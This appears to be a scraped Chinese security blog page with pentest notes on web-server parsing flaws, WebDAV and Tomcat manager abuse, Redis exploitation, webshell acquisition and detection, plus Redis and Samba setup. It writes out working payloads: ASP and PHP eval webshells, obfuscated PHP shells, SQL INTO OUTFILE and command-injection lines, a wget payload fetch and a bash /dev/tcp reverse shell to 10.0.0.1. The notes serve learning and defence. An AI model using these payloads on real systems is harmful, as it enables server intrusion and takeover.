      <a class="article-title" href="2016/08/11/文件上传之解析漏洞/">文件上传之解析漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a><strong>解析漏洞</strong></h2><p>文件上传漏洞通常与Web容器的解析漏洞配合利用 常见Web容器有IIS、Nginx、Apache、Tomcat</p>
<h2 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a><strong>IIS解析漏洞</strong></h2><p>IIS6.0在解析文件时存在以下两个解析漏洞</p>
<p>1、当建立<em>.asp、</em>.asa格式的文件夹时，其目录下任意文件都会被iis当作asp文件来解析。<br>2、当文件为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行。</p>
<p><strong>WebDav漏洞</strong></p>
<p>  WebDav是一种基于HTTP1.1协议的通信协议，它扩展了HTTP协议。在开启WebDav后若<br>支持PUT、Move、Copy、Delete等方法，就会存在安全隐患。</p>
<p>测试步骤如下：<br>    1）通过OPTIONS探测服务器所支持的HTTP方法<br>    请求：<br>    OPTIONS / HTTP/1.1<br>    Host: www.xxxx.com<br>    2)通过PUT方法向服务器上传shell<br>    请求：<br>    PUT /a.txt HTTP/1.1<br>    Host: www.xxxx.com<br>    Content-Length: 30</p>
<pre><code>&lt;%eval request(&quot;chopper&quot;) %&gt;
3)通过Move或Copy方法改名
请求：
COPY /a.txt HTTP/1.1
Host: www.xxxx.com
Destination: http://www.xxxx.com/cmd.asp
4)用DELETE方法删除文件
请求：
DELETE /a.txt HTTP/1.1
Host: www.xxxx.com
</code></pre><p>注：可用桂林老兵的IIS Write快速探测服务器是否存在WebDav漏洞</p>
<h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a><strong>Apache解析漏洞</strong></h2><p>在Apache 1.x和Apache 2.x中存在解析漏洞。 Apache在解析文件时有一个原则，当碰到不认识的扩展名时，将会从后向前解析， 直到碰到认识的扩展名为止，如果都不认识，则会暴露其源代码。 如：1.php.rar.sa.xs就会被解析为php，可以据此来绕过文件名限制 可以在Apache安装目录下的文件”/conf/mime.types”中配置Apache可以识别的文件名</p>
<h2 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a><strong>Nginx解析漏洞</strong></h2><p>对低版本的Nginx可以在任意文件名后添加%00.php进行解析攻击 如：上传图片xx.jpg，然后通过改名为xx.jpg%00.php就会解析为php</p>
<h2 id="PHP-CGI解析漏洞"><a href="#PHP-CGI解析漏洞" class="headerlink" title="PHP CGI解析漏洞"></a><strong>PHP CGI解析漏洞</strong></h2><p>当php的配置文件中的选项cgi.fix_pathinfo = 1开启时，当访问<a href="http://www.xxx.com/x.txt/x.php" target="_blank" rel="external">http://www.xxx.com/x.txt/x.php</a><br>时，若x.php不存在，则PHP会递归向前解析，将x.txt当作php脚本来解析</p>
<p>IIS7.0/7.5中：任意文件名/任意文件名.php就会被解析为php<br>Nginx中：任意文件名/任意文件名.php就会被解析为php</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/08/11/文件上传之解析漏洞/" data-id="cisvif0xa002ilohrvzcmnpta" class="article-share-link">Partager</a>
      
        <a href="http://yoursite.com/2016/08/11/文件上传之解析漏洞/#disqus_thread" class="article-comment-link">Commentaires</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/上传/">上传</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-centos搭建tomcat以及漏洞利用" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="2016/08/08/centos搭建tomcat以及漏洞利用/" class="article-date">
  <time datetime="2016-08-08T08:50:48.000Z" itemprop="datePublished">2016-08-08</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="categories/WEB/">WEB</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="2016/08/08/centos搭建tomcat以及漏洞利用/">centos搭建tomcat以及漏洞利用</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><strong>1.java安装</strong></p>
<pre><code>* 首先应该安装一个jdk java环境，可以进行rpm安装也可以进行yum安装我是用rpm安装
* 查看是否安装过java环境，操作系统的版本：rpm -qa | grep jdk  rpm -qa | grep httpd
* rpm -ivh jdk-7u80-linux-x64.rpm进行安装
* 安装完成查看版本信息
* 添加环境变量vim /etc/profile,在文件中添加这几句话
* JAVA_HOME=/usr/java/jdk1.8.0_91
* JRE_HOME=/usr/java/jdk1.8.0_91/jre
* PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin
* CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib
* export JAVA_HOME JRE_HOME PATH CLASSPATH
</code></pre><p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/13/1.png?raw=true" alt="image"></p>
<pre><code>* 
* 使配置文件生效输入 source /etc/profile
</code></pre><p><strong>2.安装tomcat</strong></p>
<pre><code>* 下载tomcat安装包 wget http://apache.fayea.com/tomcat/tomcat-8/v8.5.4/bin/apache-tomcat-8.5.4.tar.gz
* tar -zxvf apache-tomcat-8.5.4.tar.gz
* 测试启动，进入目录/usr/local/tomcat/bin
</code></pre><p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/13/2.png?raw=true" alt="image"></p>
<pre><code>* 使用curl可以查看一下主页
* curl:192.168.125.135:8080
</code></pre><p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/13/3.png?raw=true" alt="image"> </p>
<pre><code>* 关闭防火墙： service iptables stop
</code></pre><p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/13/4.png?raw=true" alt="image"> </p>
<p><strong>3.漏洞利用</strong></p>
<pre><code>*     添加一个用户
</code></pre><p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/13/5.png?raw=true" alt="image"> </p>
<pre><code>* 在文件tomcat-users.xml中添加两行：&lt;role rolename=&quot;manager-gui&quot; /&gt;
* &lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui&quot;/&gt;
</code></pre><p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/13/6.png?raw=true" alt="image"> </p>
<pre><code>* 
* 关联manger.xml新建一个文件manager.xml,在localhost下面
</code></pre><p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/13/7.png?raw=true" alt="image"></p>
<pre><code>* 在manager.xml中添加几行
* &lt;Context privileged=&quot;true&quot; antiResouceLocking=&quot;false&quot;
*         docBase=&quot;${catlina.home}/webapps/manager&quot;&gt;
*         &lt;Value className=&quot;org.apache.catalina.valves.RemoteAddValue&quot; allow=&quot;^.*$&quot; /&gt;
* &lt;/Context&gt;
</code></pre><p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/13/8.png?raw=true" alt="image"></p>
<pre><code>* 然后重新启动tomcat
* [root@localhost bin]# /usr/local/tomcat/bin/shutdown.sh
</code></pre><p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/13/9.png?raw=true" alt="image">  </p>
<pre><code>* [root@localhost bin]# /usr/local/tomcat/bin/startup.sh
</code></pre><p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/13/10.png?raw=true" alt="image">  </p>
<pre><code>* 在tomcat的后台有个war file to deploy模块，通过其可以上传war文件，tomcat可以解析war文件，能够将其解压并生成web文件，将一个jsp格式的webshell用winRar打包然后将其后缀改名为.war格式 
</code></pre><p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/13/11.png?raw=true" alt="image">  </p>
<pre><code>web中间件，tomcat解析的是jsp，apache解析的是php，iis解析的是asp，nginx看解析的是什么
</code></pre><p>上传之后会看到多了一个目录<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/13/12.png?raw=true" alt="image"><br>然后进入这个大马</p>
<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/13/13.png?raw=true" alt="image"><br>最高权限root<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/13/14.png?raw=true" alt="image">  </p>
<p><strong>4.如何防御</strong></p>
<pre><code>* 01服务降权,tomcat安装的时候默认的是系统权限，存在极大的安全问题，要将tomcat降权：可以新建一个用户，赋予它一些低的权限，修改tomcat的权限：chown xiaoming tomcat chown :xiaoming tomcat
*  chown xiaoming:xiaoming -R tomcat/  我们把tomcat的所有权限都改为xiaoming
</code></pre><p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/13/15.png?raw=true" alt="image"><br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/13/16.png?raw=true" alt="image">  </p>
<pre><code>* 然后关闭tomcat，切换到xiaoming这个账号,然后用xiaoming启动tomcat
</code></pre><p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/13/17.png?raw=true" alt="image">  </p>
<pre><code>* 
* 
* 
* 02更改端口号，tomcat默认使用的端口号是8080,还可以修改连接超时时间在/usr/local/tomcat/conf/server.xml中修改 
</code></pre><p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/13/18.png?raw=true" alt="image">  </p>
<pre><code>* 03禁止列表在/usr/local/tomcat/conf/web.xml中修改false是不能够显示目录true是能够显示目录
</code></pre><p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/13/19.png?raw=true" alt="image">  </p>
<pre><code>* 
* 现在权限是xiangming 就列不了列表了
* 04用户管理 
</code></pre><p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/13/20.png?raw=true" alt="image">  </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/08/08/centos搭建tomcat以及漏洞利用/" data-id="cisvif0r60001lohrdj5qdadj" class="article-share-link">Partager</a>
      
        <a href="http://yoursite.com/2016/08/08/centos搭建tomcat以及漏洞利用/#disqus_thread" class="article-comment-link">Commentaires</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/tomcat/">tomcat</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-webshell的获取与查杀" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="2016/08/05/webshell的获取与查杀/" class="article-date">
  <time datetime="2016-08-05T03:00:42.000Z" itemprop="datePublished">2016-08-05</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="categories/WEB/">WEB</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="2016/08/05/webshell的获取与查杀/">webshell的获取与查杀</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><strong>1. 总结获取WebShell的几种手段</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">获取webshell的几种手段</div><div class="line">sql注入（mysql数据库 具有file权限）获取webshell</div><div class="line">当前连接mysql数据库的账号具有file权限</div></pre></td></tr></table></figure></p>
<p>1·知道网站的绝对路径<figure class="highlight plain"><figcaption><span>利用：index.php?id=1 union select 1,2,3,'<?php phpinfo(); ?>' into</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">outfile &apos;/var/www/html/phpinfo.php&apos;)</div></pre></td></tr></table></figure></p>
<p>mysql有权限到网站的目录下写文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">防御：数据库连接账号不要使用root权限，php报错模式关闭,，mysql账号没有权限向网站目录写文件</div></pre></td></tr></table></figure></p>
<p><strong>2.上传漏洞获取wenshell</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">（</div><div class="line">    1.先判断是程序员自己写的上传点，还是编辑器上传功能</div><div class="line">   2.如果是编辑器上传功能，google当前编辑器漏洞（名字，版本）</div><div class="line">    3.如果是程序员写的上传点（1.上传一个正常的jpg图片2.上传一个正常jpg图片，burp拦截，修改后缀为php3.上传一个正常jpg图片，上传一个正常jpg图片，burp拦截，00截断 1.php%00.jpg）</div><div class="line">       4.判断服务器是什么类型，web服务器程序，是什么类型</div></pre></td></tr></table></figure></p>
<p>利用解析漏洞<br>  （常见的解析漏洞通常是与web容器的解析漏洞配合利用，常见的web容器有iis、nginx、apache、tomcat等等<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">    1.iis解析漏洞当建立.asp、.asa格式的文件夹时，其目录下任意文件都会被iis当做asp文件来解析</div><div class="line">      2.apache解析漏洞,apache解析文件的时候有一个原则，当碰到不认识的扩展名时，将会从后向前解析，直到碰到认识的扩展名为止，如果不认识就会暴露其源代码如：1.php.rar.sa.xs就会被解析为php，可以据此来绕过文件名限制可以在apache安装目录下的文件“/conf/mime.types”中配置apache可以识别的文件名</div><div class="line">      3.nginx解析漏洞：对低版本的nginx可以在任意文件名后添加%00.php进行解析攻击</div><div class="line">上传图片xx.jpg然后通过改名为xx.jpg%00.php就会解析为php）</div></pre></td></tr></table></figure></p>
<p><strong>3.任意命令执行获取webshell</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">条件：</div><div class="line">    知道网站绝对路径</div><div class="line">    利用代码执行漏洞读取apache配置文件，找根目录</div><div class="line">    执行pwd，获取当前工作路径</div><div class="line">    apache权限对网站目录写文件</div><div class="line">    网站图片上传目录，一般apache都要可写权限</div><div class="line">    index.php?command=echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; /var/www/</div><div class="line">html/phpinfo.php</div><div class="line">index.php?command=wget -O /var/www/html/phpinfo.php</div><div class="line">http://xxxx/phpinfo.txt</div><div class="line">  防御：修补任意命令执行获取webshell</div><div class="line">任意命令执行获取webshell 在不获取webshell的情况下，也可以控制服务器，不需要必须获取webshell，根据情况而定</div><div class="line">任意命令执行可以直接反弹一个shell</div><div class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0 &gt;&amp;1</div><div class="line">任意命令执行可以，执行远程samba里面的二进制文件</div><div class="line"> \\10.0.0.1\shell.exe</div><div class="line">powershelll</div></pre></td></tr></table></figure></p>
<p><strong>4.任意代码执行获取webshell</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">apache权限对网站目录写文件</div><div class="line">网站图片上传目录,一般apache都有可写权限</div><div class="line">利用：index.php?code=file_put_contents($_POST[f], $_POST[d]);</div><div class="line">f=phpinfo.php&amp;d=&lt;?php phpinfo(); ?&gt;</div><div class="line">apache权限没有对网站目录写文件：index.php?code=eval($_POST[1]);</div></pre></td></tr></table></figure></p>
<p><strong>5.任意文件包含获取webshell</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">本地包含：文件包含本地目录下面的木马文件获取webshell，没有木马文件就上传一个</div><div class="line">远程包含：首先要保证配置文件中开启了allow_url_include=on，然后可以包含其他网站</div></pre></td></tr></table></figure></p>
<p><strong>6.后台相关功能获取webshell</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">条件：进入后台</div><div class="line">后台相关功能获取webshell</div><div class="line">1.数据库备份功能</div><div class="line">2.数据库恢复功能</div><div class="line">3.文件管理功能</div><div class="line">持久隐藏webshell</div><div class="line">目录命名</div><div class="line">利用文件包含隐藏webshell</div><div class="line">在服务器的某个脚本文件中写入</div><div class="line">include(&quot;/upload/xxxx.jpg&quot;)；</div><div class="line">编码</div><div class="line">&lt;?php</div><div class="line">@$_++;</div><div class="line">$__=(“#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;);</div><div class="line">@$&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]);?&gt;</div><div class="line">&lt;?</div><div class="line">@$_POST[0]($_POST[1])</div><div class="line">&lt;?</div><div class="line">@eval($_POST[1])</div></pre></td></tr></table></figure></p>
<p><strong>2. 总结WebShell静态查杀的一些特征</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">分析</div><div class="line">总的思路：先找到异常日志，再找到攻击日志，整个过程分为两个步骤：webshell提取 ＋ webshell确认</div><div class="line">静态检测：</div><div class="line"></div><div class="line"> 静态特征检测面临的一个问题是误报。因为一些特征字符串正常程序本身也需要用到。</div><div class="line">比如PHP里面的eval、system等，ASP里面的FileSystemObject、include等。所以雷客图在</div><div class="line">设计之初就是一个辅助工具，最终还需要有相关安全经验的人来判定。</div><div class="line">对于少量站点可以用这样人肉去检查，如果是一个成千上万站点的大型企业呢，这个时</div><div class="line">候再人肉那工作量可就大了。所以用这样一种思路：强弱特征。即把特征码分为强弱两种特</div><div class="line">征，强特征命中则必是webshell；弱特征由人工去判断。加入一种强特征，即把流行webshell</div><div class="line">用到的特征作为强特征重点监控，一旦出现这样的特征即可确认为webshell立即进行响应。</div><div class="line">比如PHPSpy里面会出现phpspy、wofeiwo、eval($_POST[xxx])等，ASP里面出现Shell.Application</div><div class="line">等。当然，黑客完全可以变形躲过，没关系，还有人工检查的弱特征。</div><div class="line">另一个问题是漏报。程序的关键是特征字符串，它直接关系着结果，如果你的特征库里</div><div class="line">面没有记录的甚至是一种新的webshell代码，就可能束手无策了。雷客图第一版出来后，我</div><div class="line">自以为所有的ASP webshell都可以查了，但是我错了，因为不断会有新的方式出来绕过，最</div><div class="line">终结果就是特征被动的跟着webshell升级而升级，同时还面临未知的webshell——这个情况</div><div class="line">和特征码杀毒软件何其相似。</div><div class="line"></div><div class="line">    要解决误报和漏报，就不能拘泥于代码级别了。可以换个角度考虑问题：文件系统。我</div><div class="line">们可以结合文件的属性来判断，比如apache是noboy启动的，webshell的属主必然也是nobody，</div><div class="line">如果我的Web目录无缘无故多了个nobody的文件，这里就有问题了。最理想的办法是需要制度</div><div class="line">和流程来建设一个Web目录唯一发布入口，控制住这个入口，非法进来的Web文件自然可以发</div><div class="line">现。</div></pre></td></tr></table></figure></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/08/05/webshell的获取与查杀/" data-id="cisvif0wg001ylohrefel1br4" class="article-share-link">Partager</a>
      
        <a href="http://yoursite.com/2016/08/05/webshell的获取与查杀/#disqus_thread" class="article-comment-link">Commentaires</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/webshell/">webshell</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-redis漏洞利用" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="2016/08/05/redis漏洞利用/" class="article-date">
  <time datetime="2016-08-05T02:28:45.000Z" itemprop="datePublished">2016-08-05</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="categories/linux/">linux</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="2016/08/05/redis漏洞利用/">redis漏洞利用</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><strong>1.利用redis进行ssh免密码登录</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">如果启动出现问题就是开机启动配置文件先到src目录下面./redis-server ../redis.conf</div><div class="line">修改配置文件</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/12/4.png?raw=true" alt="image"><br>在客户端创建公钥文件<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/12/3.png?raw=true" alt="image"><br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/12/5.png?raw=true" alt="image"><br>在.ssh下面写文件在服务器端<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/12/6.png?raw=true" alt="image"><br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/12/7.png?raw=true" alt="image"><br>输入以上命令之后切换到服务器端发现多了一个authorized_keys文件<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/12/8.png?raw=true" alt="image"><br>以上步骤就将自己的公钥写入到了该服务器上，就可以利用自己的私钥登录到改服务器上。在192.168.125.135上使用ssh -i id_rsa root@192.168.125.123命令来连接服务器<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/12/9.png?raw=true" alt="image"><br><strong>2.反弹shell</strong><br>天假计划任务执行计划任务的ip是客户端<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/12/10.png?raw=true" alt="image"><br>如果没有nc就yum install nc安装一下<br>然后执行<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/12/11.png?raw=true" alt="image"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/08/05/redis漏洞利用/" data-id="cisvif0to000slohr1r3ktfz5" class="article-share-link">Partager</a>
      
        <a href="http://yoursite.com/2016/08/05/redis漏洞利用/#disqus_thread" class="article-comment-link">Commentaires</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/redis/">redis</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-redis的安装" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="2016/08/05/redis的安装/" class="article-date">
  <time datetime="2016-08-05T01:38:34.000Z" itemprop="datePublished">2016-08-05</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="categories/linux/">linux</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="2016/08/05/redis的安装/">redis的安装</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><strong>下载安装</strong><br>下载到当前目录下面<br><figure class="highlight plain"><figcaption><span>http://download.redis.io/redis-stable.tar.gz```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">解压文件</div><div class="line">```tar xvzf redis-stable.tar.gz</div><div class="line">cd redis-stable</div><div class="line">make</div><div class="line">make install</div></pre></td></tr></table></figure></p>
<p>出现错误<br><figure class="highlight plain"><figcaption><span>src</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">make install</div></pre></td></tr></table></figure></p>
<p>提示错误<br><figure class="highlight plain"><figcaption><span>test</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">其实直接到src目录下面执行：./redis-server</div></pre></td></tr></table></figure></p>
<p>成功就会显示<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/9/4.jpg?raw=true" alt="image"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/08/05/redis的安装/" data-id="cisvif0to000ulohrav5yzxcl" class="article-share-link">Partager</a>
      
        <a href="http://yoursite.com/2016/08/05/redis的安装/#disqus_thread" class="article-comment-link">Commentaires</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/redis/">redis</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-centos6-5samba服务器的搭建" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="2016/08/05/centos6-5samba服务器的搭建/" class="article-date">
  <time datetime="2016-08-05T01:12:30.000Z" itemprop="datePublished">2016-08-05</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="categories/linux/">linux</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="2016/08/05/centos6-5samba服务器的搭建/">centos6.5samba服务器的搭建</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><strong>一、使用Samba服务器需在防火墙下开启以下端口</strong><br><figure class="highlight plain"><figcaption><span>137</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">UDP 138</div><div class="line">TCP 139</div><div class="line">TCP 445</div><div class="line">命令：vi /etc/sysconfig/iptables #配置防火墙端口</div><div class="line">-A INPUT -m state --state NEW -m tcp -p tcp --dport 139 -j ACCEPT</div><div class="line">-A INPUT -m state --state NEW -m tcp -p tcp --dport 445 -j ACCEPT</div><div class="line">-A INPUT -m state --state NEW -m udp -p udp --dport 137 -j ACCEPT</div><div class="line">-A INPUT -m state --state NEW -m udp -p udp --dport 138 -j ACCEPT</div><div class="line">/etc/rc.d/init.d/iptables restart #重启防火墙，使规则生效</div></pre></td></tr></table></figure></p>
<p><strong>二、关闭SELINUX</strong><br><figure class="highlight plain"><figcaption><span>/etc/selinux/config</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#SELINUX=enforcing #注释掉</div><div class="line">#SELINUXTYPE=targeted #注释掉</div><div class="line">在最后一样增加：SELINUX=disabled</div><div class="line">保存，关闭</div><div class="line">命令： ：wq</div><div class="line">重启系统</div><div class="line">命令：reboot</div></pre></td></tr></table></figure></p>
<p><strong>三、安装Samba及客户端 samba-client</strong><br><figure class="highlight plain"><figcaption><span>-y install samba samba-client```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">**四、配置  samba**</div><div class="line">```设置开机自动启动</div><div class="line">命令：chkconfig smb on</div><div class="line">启动 samba 服务</div><div class="line">命令：service smb start 或 /etc/init.d/smb start</div><div class="line">设置 samba 别名服务自动启动</div><div class="line">命令：chkconfig nmb on</div><div class="line">启动 samba 别名服务</div><div class="line">命令：service nmb start 或 /etc/init.d/nmb start</div><div class="line">备份 samba 配置文件</div><div class="line">命令：cp /etc/samba/smb.conf /etc/samba/smb.confbak</div><div class="line">恢复 samba 配置文件</div><div class="line">命令：cp /etc/samba/smb.confbak /etc/samba/smb.conf</div><div class="line">进入配置文件</div><div class="line">命令：vi /etc/samba/smb.conf 找到[global]这行进行配置</div><div class="line">我自己的配置方法是删除 smb.conf 文件，再创建 smb.conf 文件自行配置信息</div><div class="line">配置信息如下：</div><div class="line">[global]</div><div class="line">workgroup = WORKGROUP #工作组（可自行设置）</div><div class="line">service string = Samba Server #设置 samba 服务器名称[可自行更改]</div><div class="line">netbios name = SambaServer #设置服务器访问别名[可自行更改]</div><div class="line">security = user #设置 samba 服务器安全级别为 user，即</div><div class="line">以账号和口令访问</div><div class="line">[rise] #在 Windows 网上邻居中看到的共享目录</div><div class="line">的名字</div><div class="line">path = /home/rise #共享文件地址</div><div class="line">public = no #不公开目录</div><div class="line">writeable = yes #共享目录可以读写</div><div class="line">valid user = rise #只允许 rise 用户访问</div><div class="line">browseable = yes #</div><div class="line">保存配置信息。</div><div class="line">命令： 